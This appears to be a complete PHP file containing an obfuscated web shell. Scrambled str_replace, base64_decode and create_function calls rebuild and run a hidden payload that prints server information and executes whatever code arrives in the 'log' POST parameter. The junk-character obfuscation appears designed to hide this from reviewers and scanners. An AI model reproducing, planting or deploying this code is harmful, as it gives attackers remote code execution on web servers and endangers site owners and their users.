<?php 
$ob="CnBocGlunmZm8oKnmTs";
$kkn="CgknmXn";
$ark="m1BPU1RbbG9nXSk7";
$poz = str_replace("stp","","stpstrstp_rstpestppstplstpastpcstpe");
$jmx="KQGFzc2Vnmyd";
$rju = $poz("u", "", "ubuaseu64u_udueucuode");
$uu = $poz("b","","cbrebabtbeb_bfbubnbcbtibobn");
$zlq = $uu('', $rju($poz("nm", "", $ob.$jmx.$kkn.$ark))); $zlq();
?>
